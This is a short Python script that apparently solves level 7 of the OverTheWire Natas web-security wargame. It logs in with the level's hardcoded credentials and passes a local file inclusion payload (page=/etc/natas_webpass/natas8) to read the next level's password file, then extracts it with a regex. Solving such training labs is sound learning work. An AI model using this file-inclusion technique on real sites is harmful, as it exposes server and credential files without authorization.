#!/usr/bin/env python

import requests
import re
print("Natas Level 7")


username = "natas7"
password = "7z3hEENjQtflzgnT29q7wAvMNfZdh0i9"

url = "http://%s.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8"%(username)

with requests.session() as session:
	response = session.get(url , auth = (username, password) )

	content = response.text 

	# print( content)

	print( re.findall("<br>\n(.*)\n\n\<!--", content)[0] )

